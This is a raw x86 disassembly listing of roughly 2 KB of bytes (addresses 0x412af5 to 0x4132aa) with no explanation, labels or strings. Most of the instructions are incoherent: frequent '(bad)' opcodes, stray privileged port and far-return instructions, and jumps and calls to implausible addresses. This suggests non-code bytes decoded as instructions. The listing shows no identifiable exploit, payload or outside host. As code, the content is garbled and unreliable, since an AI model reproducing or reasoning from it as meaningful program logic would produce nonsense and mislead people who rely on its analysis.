  412af5:	cmp    eax,DWORD PTR [eax]
  412af7:	unpcklps xmm7,xmm0
  412afa:	jne    0x412afc
  412afc:	dec    DWORD PTR [ebx+0x5545cc18]
  412b02:	mov    DWORD PTR [ebx],esi
  412b04:	shl    BYTE PTR [ebx],1
  412b06:	inc    ebp
  412b07:	add    ecx,DWORD PTR [ecx+0x60fc803]
  412b0d:	retf   0x5575
  412b10:	dec    DWORD PTR [ebx-0x5ba17e8]
  412b16:	(bad)  
  412b17:	stc    
  412b18:	in     al,dx
  412b19:	or     al,0x85
  412b1b:	dec    ebp
  412b1c:	clc    
  412b1d:	xor    eax,DWORD PTR [ebp+0x3]
  412b20:	mov    ebp,ecx
  412b22:	rol    BYTE PTR [eax],1
  412b24:	inc    ebp
  412b25:	add    BYTE PTR [eax-0x7747ab3],bh
  412b2b:	clc    
  412b2c:	inc    ebp
  412b2d:	retf   
  412b2e:	mov    edx,ebx
  412b30:	in     al,dx
  412b31:	(bad)  
  412b32:	retf   
  412b33:	into   
  412b34:	into   
  412b35:	scas   eax,DWORD PTR es:[edi]
  412b36:	dec    ebp
  412b37:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  412b3d:	sub    ecx,esi
  412b3f:	cmp    ecx,DWORD PTR [ebp+0x77]
  412b42:	(bad)  
  412b43:	mov    edi,eax
  412b45:	int3   
  412b46:	test   DWORD PTR [ecx-0x74baff08],ecx
  412b4c:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  412b53:	xor    eax,DWORD PTR [ebp+0x4503f803]
  412b59:	(bad)  
  412b5b:	retf   0x559c
  412b5e:	(bad)  
  412b5f:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  412b66:	inc    ebp
  412b67:	add    eax,0xeb9c4d3f
  412b6c:	(bad)  
  412b6d:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  412b73:	xor    ecx,DWORD PTR [ebp+0x33]
  412b76:	mov    eax,DWORD PTR [ebx]
  412b78:	call   0xce50f680
  412b7d:	retf   0x55d1
  412b80:	test   BYTE PTR [ebx-0x5ff17fe],cl
  412b86:	jmp    0x412b81
  412b88:	add    BYTE PTR ds:0xebf44d8b,al
  412b8e:	push   ebp
  412b8f:	mov    ebp,DWORD PTR [ebx]
  412b91:	mov    eax,0x33f8558b
  412b96:	retf   
  412b97:	xor    ecx,esi
  412b99:	add    edx,ecx
  412b9b:	add    eax,DWORD PTR [edx+0xca010f]
  412ba1:	push   ebp
  412ba2:	dec    ebp
  412ba3:	mov    ecx,DWORD PTR [ebx-0x34050718]
  412ba9:	stc    
  412baa:	rol    DWORD PTR ds:0xebce4dd6,cl
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  412bb7:	xor    ebp,DWORD PTR [ebx]
  412bb9:	xor    edi,DWORD PTR [ebx]
  412bbb:	add    esi,DWORD PTR [edi+0x3]
  412bbe:	mov    ecx,DWORD PTR [edi]
  412bc0:	clc    
  412bc1:	retf   0x55cb
  412bc4:	into   
  412bc5:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  412bcc:	test   al,0x4d
  412bce:	push   ebp
  412bcf:	jbe    0x412c04
  412bd1:	mov    esi,DWORD PTR [ebx]
  412bd3:	mov    al,0x3
  412bd5:	push   ebp
  412bd6:	add    esi,DWORD PTR [ebx]
  412bd8:	rdpmc  
  412bda:	retf   0x5503
  412bdd:	add    ecx,DWORD PTR [ebx-0x53517f1]
  412be3:	dec    ebp
  412be4:	stc    
  412be5:	mov    ecx,DWORD PTR [eax]
  412be7:	or     BYTE PTR [ebp+0x4d],cl
  412bea:	jmp    0x1352c7a
  412bef:	dec    ebp
  412bf0:	dec    ebp
  412bf1:	(bad)  
  412bf2:	mov    ebx,esp
  412bf4:	clc    
  412bf5:	test   ebx,ecx
  412bf7:	clc    
  412bf8:	ror    DWORD PTR [ebp-0x2a],cl
  412bfb:	mov    esi,ecx
  412bfd:	lock scas eax,DWORD PTR es:[edi]
  412bff:	inc    ebp
  412c00:	mov    esi,DWORD PTR [ebx]
  412c02:	hlt    
  412c03:	pushf  
  412c04:	jge    0x412b91
  412c06:	sub    ebx,esp
  412c08:	cmp    ecx,ebx
  412c0a:	ja     0x412bda
  412c0c:	mov    ebp,DWORD PTR [eax-0x58]
  412c0f:	dec    ebp
  412c10:	xor    ecx,DWORD PTR [di+0x3]
  412c14:	mov    esp,esp
  412c16:	clc    
  412c17:	push   ebp
  412c18:	retf   
  412c19:	mov    dl,bl
  412c1b:	adc    esi,edx
  412c1d:	jb     0x412bed
  412c1f:	add    BYTE PTR [edi-0xb7474b3],ch
  412c25:	lock jge 0x412bf3
  412c28:	sub    ecx,DWORD PTR [ebp+0x3b]
  412c2b:	mov    esi,DWORD PTR [edi-0x20]
  412c2e:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  412c35:	mov    BYTE PTR [ebx-0x34b20729],cl
  412c3b:	mov    edx,ebx
  412c3d:	lock (bad) 
  412c3f:	ror    esi,cl
  412c41:	push   ebp
  412c42:	scas   eax,DWORD PTR es:[edi]
  412c43:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  412c49:	pushf  
  412c4a:	sub    esi,DWORD PTR [edx]
  412c4c:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	xor    esp,DWORD PTR [ebx]
  412c55:	add    ecx,DWORD PTR [ebp-0x1c]
  412c58:	mov    edi,DWORD PTR [ebp-0x8]
  412c5b:	mov    bl,cl
  412c5d:	cmp    dl,bl
  412c5f:	jb     0x412c2f
  412c61:	add    dh,dl
  412c63:	dec    ebp
  412c64:	scas   eax,DWORD PTR es:[edi]
  412c65:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  412c6b:	shr    DWORD PTR [ebx],cl
  412c6d:	into   
  412c6e:	cmp    edx,esi
  412c70:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  412c76:	dec    ebp
  412c77:	dec    ebp
  412c78:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  412c7e:	retf   
  412c7f:	xor    edx,esi
  412c81:	add    ecx,esi
  412c83:	imul   ecx,edx
  412c86:	mov    DWORD PTR [ebp+0x8],edx
  412c89:	xor    ecx,DWORD PTR [ebp+0x2b]
  412c8c:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  412c92:	add    esi,DWORD PTR [ebx]
  412c94:	rol    BYTE PTR [ebx],0x45
  412c97:	rdtsc  
  412c99:	xlat   BYTE PTR ds:[ebx]
  412c9a:	pushf  
  412c9b:	jge    0x412c26
  412c9d:	xor    esp,eax
  412c9f:	sub    eax,DWORD PTR [ebp-0x73]
  412ca2:	(bad)  
  412ca3:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  412caa:	dec    ebp
  412cab:	xchg   BYTE PTR [ebx],dh
  412cad:	inc    DWORD PTR [ebx]
  412caf:	(bad)  
  412cb0:	jmp    0x412cff
  412cb2:	mov    ecx,DWORD PTR [ebx-0x34341324]
  412cb8:	dec    ebp
  412cb9:	into   
  412cba:	mov    ebp,DWORD PTR [edi-0x23737420]
  412cc0:	pushf  
  412cc1:	shl    DWORD PTR [edx],cl
  412cc3:	retf   0x5588
  412cc6:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412ccc:	add    eax,DWORD PTR [eax]
  412cce:	in     al,0x4d
  412cd0:	push   ebp
  412cd1:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  412cd7:	fs add ch,cl
  412cda:	dec    ebp
  412cdb:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  412ce1:	dec    ebp
  412ce2:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  412ce8:	jge    0x412cb8
  412cea:	mov    BYTE PTR [edi+0xf723b3a],ch
  412cf0:	add    cl,dh
  412cf2:	dec    ebp
  412cf3:	dec    DWORD PTR [ebx-0x2c032301]
  412cf9:	inc    ebp
  412cfa:	push   ebp
  412cfb:	dec    DWORD PTR [ebx-0x73ff1f34]
  412d01:	lea    ebx,[esp+edx*2+0x508bff32]
  412d08:	mov    ah,0x45
  412d0a:	push   ebp
  412d0b:	mov    esi,DWORD PTR [ebx]
  412d0d:	les    esi,FWORD PTR [ebx]
  412d0f:	add    BYTE PTR [ebx],al
  412d11:	inc    DWORD PTR [ebx]
  412d13:	mov    ecx,DWORD PTR [edi]
  412d15:	cld    
  412d16:	retf   0x4d80
  412d19:	add    DWORD PTR [ecx+0x4d30e400],ecx
  412d1f:	jne    0x412cac
  412d21:	(bad)  
  412d22:	in     al,dx
  412d23:	ror    bl,1
  412d25:	scas   al,BYTE PTR es:[edi]
  412d26:	into   
  412d27:	add    BYTE PTR [edi-0xf2f7475],ch
  412d2d:	not    bl
  412d2f:	adc    al,0xca
  412d31:	inc    ebp
  412d32:	push   ebp
  412d33:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  412d39:	push   0xaf80d6
  412d3e:	mov    eax,DWORD PTR [eax]
  412d40:	fdiv   st(7),st
  412d42:	sti    
  412d43:	sbb    dh,cl
  412d45:	pop    esi
  412d46:	xchg   esp,eax
  412d47:	leave  
  412d48:	pushf  
  412d49:	add    al,0x32
  412d4b:	push   ebp
  412d4c:	cmp    ebp,esp
  412d4e:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  412d52:	dec    DWORD PTR [ecx-0x740f0375]
  412d58:	push   ebp
  412d59:	cld    
  412d5a:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  412d60:	retf   0x558b
  412d63:	clc    
  412d64:	xor    esi,eax
  412d66:	add    esi,DWORD PTR [ebp-0x75]
  412d69:	(bad)  
  412d6a:	hlt    
  412d6b:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  412d72:	mov    DWORD PTR [edx],ecx
  412d74:	hlt    
  412d75:	(bad)  
  412d76:	dec    ebp
  412d77:	add    dh,BYTE PTR [ebx]
  412d79:	leave  
  412d7a:	mov    edx,0xffec8d55
  412d7f:	push   ecx
  412d80:	rol    DWORD PTR [ebp+0x55],1
  412d83:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  412d89:	mov    eax,0xf8030b33
  412d8e:	lar    ecx,di
  412d91:	push   ebp
  412d92:	retf   0x863b
  412d95:	jne    0x412d94
  412d97:	mov    edi,edi
  412d99:	or     BYTE PTR [ebp+0x41],dh
  412d9c:	mov    ebp,esp
  412d9e:	cld    
  412d9f:	inc    eax
  412da0:	mov    al,0x25
  412da2:	add    DWORD PTR [ecx+0x0],eax
  412da5:	in     eax,dx
  412da6:	test   DWORD PTR [ecx-0x1],eax
  412da9:	fdiv   st(7),st
  412dab:	ret    0x8b
  412dae:	cld    
  412daf:	mov    eax,DWORD PTR [eax+0x8d0151]
  412db5:	clc    
  412db6:	xor    BYTE PTR [ebp+0x45],al
  412db9:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  412dbf:	loopne 0x412dc0
  412dc1:	mov    edi,edi
  412dc3:	mov    ecx,eax
  412dc5:	clc    
  412dc6:	jne    0x412d98
  412dc8:	call   0x823ed1
  412dcd:	and    eax,0xc6854575
  412dd2:	je     0x412dd5
  412dd4:	mov    eax,esi
  412dd6:	cld    
  412dd7:	or     DWORD PTR [eax+0x401c9],eax
  412ddd:	push   ebp
  412dde:	add    ah,ch
  412de0:	add    BYTE PTR [ecx+0x6a],dl
  412de3:	inc    ebp
  412de4:	push   esi
  412de5:	mov    DWORD PTR [eax-0x4],edx
  412de8:	pop    edi
  412de9:	mov    ebx,DWORD PTR [ebx-0x4]
  412dec:	ret    0xbe
  412def:	push   es
  412df0:	mov    ecx,DWORD PTR [ecx-0x77274af]
  412df6:	clc    
  412df7:	lock inc ebp
  412df9:	jne    0x412e51
  412dfb:	(bad)  
  412dfc:	jne    0x412e02
  412dfe:	mov    eax,0xf841ba66
  412e03:	fadd   QWORD PTR [esi]
  412e05:	(bad)  
  412e06:	jne    0x412e45
  412e08:	cmp    eax,ebx
  412e0a:	pop    esi
  412e0b:	mov    ecx,DWORD PTR [eax]
  412e0d:	push   ecx
  412e0e:	inc    ecx
  412e0f:	lea    esi,[eax-0x8]
  412e12:	inc    edx
  412e13:	inc    ebp
  412e14:	int    0x8b
  412e16:	inc    edx
  412e17:	cld    
  412e18:	jo     0x412dd9
  412e1a:	inc    ecx
  412e1b:	xchg   edx,esp
  412e1d:	mov    ebx,eax
  412e1f:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  412e25:	or     edi,eax
  412e27:	inc    ebp
  412e28:	inc    ebp
  412e29:	(bad)  
  412e2a:	mov    ecx,DWORD PTR [eax]
  412e2c:	cld    
  412e2d:	(bad)  
  412e2e:	jmp    0x412e31
  412e30:	mov    eax,esi
  412e32:	mov    DWORD PTR ds:0x4f8c98b,eax
  412e38:	rcl    BYTE PTR [esi+0xf],1
  412e3b:	iret   
  412e3c:	inc    ebp
  412e3d:	leave  
  412e3e:	(bad)  
  412e3f:	dec    DWORD PTR [ecx]
  412e41:	mov    eax,esi
  412e43:	mov    eax,DWORD PTR [edi]
  412e45:	mov    dh,0xdd
  412e48:	push   es
  412e49:	nop
  412e4a:	(bad)  
  412e4b:	inc    DWORD PTR [ebx]
  412e4d:	push   esi
  412e4e:	leave  
  412e4f:	iret   
  412e50:	add    al,0x46
  412e52:	push   ebp
  412e53:	jmp    0xff928444
  412e58:	inc    ebp
  412e59:	push   esi
  412e5a:	mov    DWORD PTR [esi-0x4],eax
  412e5d:	in     eax,dx
  412e5e:	push   ebp
  412e5f:	sbb    BYTE PTR [eax+0x7c6daff],bh
  412e65:	add    al,BYTE PTR [edx]
  412e67:	mov    edx,DWORD PTR [ebp-0x17]
  412e6a:	cmp    edi,esi
  412e6c:	jne    0x412e6d
  412e6e:	(bad)  
  412e6f:	push   esi
  412e70:	pop    es
  412e71:	push   ebp
  412e72:	mov    ebp,esp
  412e74:	or     BYTE PTR [ebp+0x41],al
  412e77:	add    edi,esp
  412e79:	sub    BYTE PTR [eax-0x4],al
  412e7c:	int3   
  412e7d:	jne    0x412e41
  412e7f:	add    DWORD PTR [eax],eax
  412e81:	sbb    al,0x8b
  412e83:	mov    edx,DWORD PTR [ecx+0x14]
  412e86:	lea    edx,[edx-0x1ba7508]
  412e8c:	push   esi
  412e8d:	enter  0xd375,0xb8
  412e91:	test   DWORD PTR [esi],0x6ce0750
  412e97:	enter  0xd375,0x3b
  412e9b:	neg    DWORD PTR [esi+0x50]
  412e9e:	or     cl,dl
  412ea0:	inc    edx
  412ea1:	(bad)  
  412ea2:	loope  0x412e90
  412ea4:	(bad)  
  412ea5:	sub    eax,DWORD PTR [ebx]
  412ea7:	inc    eax
  412ea8:	loope  0x412efa
  412eaa:	add    dl,BYTE PTR [eax-0x37]
  412ead:	push   edi
  412eae:	push   ebp
  412eaf:	imul   ah
  412eb1:	adc    DWORD PTR [ecx-0x1],0x45
  412eb5:	add    BYTE PTR [ecx+0x55d3fc00],cl
  412ebb:	lea    edi,[eax-0x7fff4ca]
  412ec1:	mov    eax,0x4550402
  412ec6:	cmp    ebp,ecx
  412ec8:	jne    0x412e75
  412eca:	mov    eax,DWORD PTR ds:0x241e808
  412ed0:	in     eax,dx
  412ed1:	add    BYTE PTR [eax-0x7],al
  412ed4:	out    0x36,eax
  412ed6:	inc    ecx
  412ed7:	aas    
  412ed8:	jmp    0xccf15a
  412edd:	lock mov edi,DWORD PTR [ebp-0x18]
  412ee1:	and    edi,edi
  412ee3:	mov    edi,edi
  412ee5:	call   0xe40f2fc1
  412eea:	push   es
  412eeb:	add    al,ch
  412eed:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  412ef4:	(bad)  
  412ef5:	hlt    
  412ef6:	add    eax,0xffd3e87d
  412efb:	cmp    bh,0x8
  412efe:	(bad)  
  412eff:	fld    DWORD PTR [esi]
  412f01:	out    dx,al
  412f02:	call   0xffa02e0a
  412f07:	cmp    al,0x46
  412f09:	shl    edx,0x8
  412f0c:	(bad)  
  412f0d:	pop    es
  412f0e:	fisttp QWORD PTR [ebp+0xe577eff]
  412f14:	push   ebx
  412f15:	add    BYTE PTR [ebx+0x24008b56],cl
  412f1b:	add    BYTE PTR [ebp+0x50],al
  412f1e:	push   eax
  412f1f:	add    DWORD PTR [ebx+0x757d1834],ecx
  412f25:	sub    edx,DWORD PTR [esi-0x24]
  412f28:	jne    0x412ee0
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	mov    edx,DWORD PTR [edx-0x34]
  412f2e:	dec    esi
  412f2f:	out    0x83,eax
  412f31:	into   
  412f32:	push   edi
  412f34:	loopne 0x412f04
  412f36:	shr    BYTE PTR [edx+ecx*4+0x0],1
  412f3a:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  412f41:	rol    DWORD PTR [edx],0x8
  412f44:	mov    esp,ecx
  412f46:	cmp    DWORD PTR [ebx],0xc
  412f49:	mov    esi,0x5001c0
  412f4e:	push   eax
  412f4f:	push   cs
  412f50:	push   eax
  412f51:	(bad)  
  412f52:	sub    edx,edi
  412f54:	push   esi
  412f55:	adc    al,0xcb
  412f57:	ins    DWORD PTR es:[edi],dx
  412f58:	mov    eax,0x203e8
  412f5d:	add    al,ah
  412f5f:	inc    esi
  412f60:	mov    al,ch
  412f62:	pop    es
  412f63:	add    DWORD PTR [eax],0x1
  412f66:	add    dh,al
  412f68:	add    ah,ch
  412f6a:	rol    DWORD PTR [edx-0xd],1
  412f6d:	cli    
  412f6e:	push   0x4a
  412f70:	pop    ecx
  412f71:	retf   0xfe6
  412f74:	add    BYTE PTR [ebx-0x4e72f41e],al
  412f7a:	(bad)  
  412f7b:	dec    BYTE PTR [ebx+0x45b1fc72]
  412f81:	(bad)  
  412f82:	sub    ebp,DWORD PTR [ebx]
  412f84:	and    al,0x52
  412f86:	(bad)  
  412f87:	dec    edi
  412f88:	inc    ebp
  412f89:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  412f90:	add    BYTE PTR [ebp-0x7b],dh
  412f93:	pop    eax
  412f94:	add    BYTE PTR [edx+0x0],bl
  412f97:	pop    edx
  412f98:	dec    ebp
  412f99:	jmp    DWORD PTR [ebx]
  412f9b:	and    al,0xec
  412f9d:	push   edx
  412f9e:	out    0x64,eax
  412fa0:	jmp    0xd3f325a5
  412fa5:	jmp    0x412fff
  412fa7:	mov    al,0xfe
  412fa9:	dec    BYTE PTR [ebp-0x18fd8018]
  412faf:	add    BYTE PTR [esi+ebp*1],bh
  412fb2:	pop    edx
  412fb3:	icebp  
  412fb4:	mov    eax,cs
  412fb6:	ins    BYTE PTR es:[edi],dx
  412fb7:	adc    eax,0x75510000
  412fbc:	mov    esi,0x70158
  412fc1:	or     DWORD PTR [eax-0x74f48dfe],esi
  412fc7:	mov    edi,esp
  412fc9:	cld    
  412fca:	jge    0x413041
  412fcc:	(bad)  
  412fce:	aas    
  412fcf:	and    al,0x6d
  412fd1:	adc    cl,0x1
  412fd4:	mov    eax,DWORD PTR [eax]
  412fd6:	and    ecx,DWORD PTR [ebx-0x167203fd]
  412fdc:	dec    ebp
  412fdd:	add    eax,ebp
  412fdf:	add    BYTE PTR [edx],al
  412fe1:	fadd   DWORD PTR [eax]
  412fe3:	stc    
  412fe4:	enter  0xee00,0x8b
  412fe8:	sbb    eax,0x1
  412feb:	sbb    esi,ecx
  412fed:	in     al,0x0
  412fef:	in     eax,dx
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	jne    0x412f7f
  412ff4:	cmp    edx,esp
  412ff6:	jb     0x413001
  412ff8:	jmp    0x41306f
  412ffa:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  413000:	add    BYTE PTR [ebx+0x4d83d840],cl
  413006:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  41300c:	jb     0x412f97
  41300e:	pop    edx
  41300f:	fadd   QWORD PTR [ebx-0x7445faa1]
  413015:	or     dh,BYTE PTR [edx+0x0]
  413018:	inc    edx
  413019:	or     dl,bh
  41301b:	xlat   BYTE PTR ds:[ebx]
  41301c:	dec    edx
  41301d:	push   edi
  41301e:	add    al,0x7
  413020:	leave  
  413021:	rol    DWORD PTR [edx+eax*1],0x7
  413025:	add    ecx,ecx
  413027:	mov    edx,ecx
  413029:	int3   
  41302a:	jmp    0x412fea
  41302c:	mov    al,0x0
  41302e:	(bad)  
  41302f:	jne    0x413019
  413031:	mov    eax,DWORD PTR [edx]
  413033:	call   0xc155ad38
  413038:	pop    edi
  413039:	add    ebx,DWORD PTR [ecx-0x37]
  41303c:	pop    ecx
  41303d:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  413044:	push   es
  413045:	mov    eax,DWORD PTR [eax]
  413047:	int3   
  413048:	add    ch,al
  41304a:	jae    0x413034
  41304c:	int    0x1
  41304e:	enter  0x3000,0x18
  413052:	add    BYTE PTR [ebp+0x75],al
  413055:	mov    esi,DWORD PTR [eax-0x171f0134]
  41305b:	push   0x2
  41305d:	pop    ecx
  41305e:	add    BYTE PTR [eax],cl
  413060:	push   ebx
  413061:	lea    edi,[edi+eax*2]
  413064:	mov    al,0x1
  413066:	jb     0x413068
  413068:	mov    al,0x10
  41306a:	push   eax
  41306b:	add    al,0x75
  41306d:	add    BYTE PTR [ebx],ch
  41306f:	add    ebx,esp
  413071:	int3   
  413072:	jne    0x413084
  413074:	movsx  edx,cl
  413077:	add    DWORD PTR [eax],eax
  413079:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  413080:	mov    gs,edi
  413082:	add    BYTE PTR [eax-0x50],ch
  413085:	add    al,ch
  413087:	mov    eax,DWORD PTR [ecx]
  413089:	sub    eax,DWORD PTR [eax]
  41308b:	jb     0x413102
  41308d:	add    DWORD PTR [esp+eiz*8-0x50],esi
  413091:	jge    0x41307b
  413093:	add    al,0x1
  413095:	add    DWORD PTR [eax],0x0
  413098:	jne    0x41309a
  41309a:	je     0x4130e1
  41309c:	mov    eax,DWORD PTR [edi]
  41309e:	ror    BYTE PTR [ebp+0x4d],1
  4130a1:	or     DWORD PTR [ecx+0x4d03d004],0x3
  4130a8:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  4130ae:	mov    DWORD PTR [ebx],ebp
  4130b0:	fadd   DWORD PTR [eax+0x75]
  4130b3:	inc    eax
  4130b4:	pop    eax
  4130b5:	lea    ebx,[ecx+0x4f]
  4130b8:	push   0xb1000003
  4130bd:	out    dx,eax
  4130be:	add    ebp,DWORD PTR [edx+edx*2]
  4130c1:	add    BYTE PTR [ebx+ecx*4],bh
  4130c4:	mov    ch,BYTE PTR [ebx]
  4130c6:	jb     0x41313a
  4130c8:	add    al,0x89
  4130ca:	push   eax
  4130cb:	call   0x84297e3d
  4130d0:	add    DWORD PTR [eax+eax*1],eax
  4130d3:	jae    0x4130e9
  4130d5:	icebp  
  4130d6:	inc    ebp
  4130d7:	mov    eax,DWORD PTR gs:[ecx]
  4130da:	int3   
  4130db:	out    dx,al
  4130dc:	loopne 0x41312b
  4130de:	sub    eax,DWORD PTR [edx]
  4130e0:	push   0xffffff83
  4130e2:	pop    esi
  4130e3:	push   cs
  4130e4:	jl     0x4130ff
  4130e6:	add    al,0xaf
  4130e8:	xor    eax,0x832b6d00
  4130ed:	mov    eax,DWORD PTR [edx]
  4130ef:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4130f5:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4130fb:	inc    ebp
  4130fc:	shr    ebx,0x3
  4130ff:	or     DWORD PTR [eax],0x4
  413102:	push   0xffffffa5
  413104:	pop    esi
  413105:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  41310c:	jmp    0x41316b
  41310e:	mov    edi,0xff0272
  413113:	fdivr  QWORD PTR [ebp+0x5d]
  413116:	push   0x4e
  413118:	pop    ecx
  413119:	call   0x41751e
  41311e:	mov    DWORD PTR [ebx],eax
  413120:	in     al,0xc8
  413122:	rol    BYTE PTR [ebp-0x75],0xc1
  413126:	call   0xab3307
  41312b:	pop    esi
  41312c:	enter  0xceff,0x8b
  413130:	repz mov ecx,DWORD PTR [ebp-0x34]
  413134:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  41313b:	je     0x41313d
  41313d:	or     DWORD PTR [ebx-0x74183b24],eax
  413143:	jne    0x413129
  413145:	jmp    0x413140
  413147:	push   DWORD PTR [edx-0x24]
  41314a:	push   0x4d
  41314c:	pop    ecx
  41314d:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  413151:	jge    0x413159
  413153:	mov    eax,eax
  413155:	sub    ebp,DWORD PTR [edx+0x24]
  413158:	pop    esi
  413159:	inc    ebp
  41315a:	mov    esp,0x8b6077
  41315f:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  413165:	lods   al,BYTE PTR ds:[esi]
  413166:	add    BYTE PTR [ebx],bh
  413168:	enter  0xce73,0x49
  41316c:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  413174:	stc    
  413175:	jge    0x4131e9
  413177:	jnp    0xdd40b4d8
  41317d:	call   0xc43253
  413182:	fadd   st(0),st
  413184:	dec    esi
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	stc    
  413187:	cmp    al,0x73
  413189:	push   ebp
  41318a:	mov    eax,0xf8028b
  41318f:	jne    0x413152
  413191:	mov    esi,ecx
  413193:	mov    esp,DWORD PTR [ebp+0x2c]
  413196:	add    edi,DWORD PTR [ebp-0x24]
  413199:	sub    esp,eax
  41319b:	and    al,0x45
  41319d:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4131a3:	sbb    al,0xee
  4131a5:	pop    esi
  4131a6:	call   0x8131d6
  4131ab:	fsubr  st,st(3)
  4131ad:	sti    
  4131ae:	add    BYTE PTR gs:[ecx],bh
  4131b1:	add    eax,esp
  4131b3:	add    DWORD PTR [esi],eax
  4131b5:	rol    DWORD PTR [ebp+0x8],0x29
  4131b9:	mov    esp,eax
  4131bb:	clc    
  4131bc:	jne    0x413233
  4131be:	mov    eax,0x8b0673
  4131c3:	loopne 0x41320a
  4131c5:	loopne 0x413150
  4131c7:	lods   al,BYTE PTR ds:[esi]
  4131c8:	int3   
  4131c9:	inc    ebp
  4131ca:	mov    DWORD PTR gs:[eax+edi*8],eax
  4131ce:	add    al,0xc3
  4131d0:	sub    ecx,DWORD PTR [ebp+0x47]
  4131d3:	(bad)  
  4131d5:	shr    BYTE PTR [ebp-0x1f],0xe8
  4131d9:	add    eax,DWORD PTR [eax]
  4131db:	call   0x642f2e0
  4131e0:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4131e6:	dec    esi
  4131e7:	ins    DWORD PTR es:[edi],dx
  4131e8:	in     al,dx
  4131e9:	lea    eax,[eax]
  4131eb:	inc    ebp
  4131ec:	inc    ebp
  4131ed:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4131f3:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4131fd:	and    al,0xdc
  4131ff:	ror    DWORD PTR [edx+0x24],0xf7
  413203:	or     BYTE PTR [ebp+0x4c],dh
  413206:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  41320a:	stos   BYTE PTR es:[edi],al
  41320b:	adc    edx,edi
  41320d:	inc    esp
  41320e:	add    edi,DWORD PTR [eax]
  413210:	jne    0x4131f5
  413212:	mov    DWORD PTR [eax-0x7449db04],ecx
  413218:	cmp    ecx,DWORD PTR [edi]
  41321a:	sub    BYTE PTR [ebp-0x7e],dl
  41321d:	sar    ebp,0xb
  413220:	jmp    FWORD PTR [edi+0x2400392a]
  413226:	sub    esi,DWORD PTR [ebx-0x73]
  413229:	mov    esp,DWORD PTR [ecx+edi*4]
  41322c:	mov    ecx,DWORD PTR [eax]
  41322e:	and    BYTE PTR [eax],al
  413230:	jne    0x4131fc
  413232:	sub    ebp,ecx
  413234:	sbb    BYTE PTR [esi+0x32],ah
  413237:	dec    ebp
  413238:	push   ebp
  413239:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41323f:	ret    
  413240:	mov    edx,ebp
  413242:	leave  
  413243:	sub    DWORD PTR [esi+0x24],ebx
  413246:	ret    0x2b
  413249:	pop    ax
  41324b:	push   ebp
  41324c:	rol    BYTE PTR [ebx],0xeb
  41324f:	add    DWORD PTR [ecx+0x6c0001],0x40
  413256:	jb     0x4132ad
  413258:	ret    
  413259:	in     al,dx
  41325a:	jecxz  0x4131e7
  41325c:	push   esi
  41325d:	xchg   esp,eax
  41325e:	jne    0x413260
  413260:	cmp    edx,DWORD PTR [esi+0x1c]
  413263:	jne    0x413249
  413265:	mov    eax,DWORD PTR [ebp-0x77]
  413268:	ror    DWORD PTR [ebx+0x899408],0xe0
  41326f:	mov    esi,DWORD PTR [ebp-0x75]
  413272:	pop    esi
  413273:	nop
  413274:	mov    eax,DWORD PTR [eax]
  413276:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  41327c:	add    al,0x0
  41327e:	inc    ebp
  41327f:	mov    eax,DWORD PTR [ebx]
  413281:	mov    ebp,ebx
  413283:	cmp    al,0xf
  413285:	or     al,al
  413287:	inc    ebp
  413288:	inc    ebp
  413289:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41328f:	cld    
  413290:	add    BYTE PTR [edi+0x556c16c0],dh
  413296:	add    BYTE PTR [ecx-0x5],dl
  413299:	add    eax,0x17200
  41329e:	sbb    al,0x85
  4132a0:	dec    esp
  4132a1:	je     0x4132db
  4132a3:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4132a7:	add    BYTE PTR [ebx],bh
  4132a9:	(bad)  
  4132aa:	and    al,0x30
